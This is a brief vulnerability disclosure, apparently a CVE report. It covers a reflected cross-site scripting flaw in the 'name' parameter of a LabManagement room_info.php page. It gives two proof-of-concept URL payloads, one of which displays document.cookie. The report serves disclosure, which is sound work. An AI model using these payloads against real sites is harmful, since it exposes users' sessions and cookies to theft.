BUG_Author: LeoZhangCA

Vulnerability File: /LabManagement/views/room_info.php

GET parameter "name" exists reflected cross-site scripting vulnerability

Payload1:/LabManagement/views/room_info?name=<script>alert('xss')</script>&id=6

![image](https://github.com/LeozhangCA/CVEReport/blob/main/picture/reflectedXSS1.png)

Payload2:/LabManagement/views/room_info?name=<script>alert(document.cookie)</script>&id=6

![image](https://github.com/LeozhangCA/CVEReport/blob/main/picture/reflectedXSS2.png)

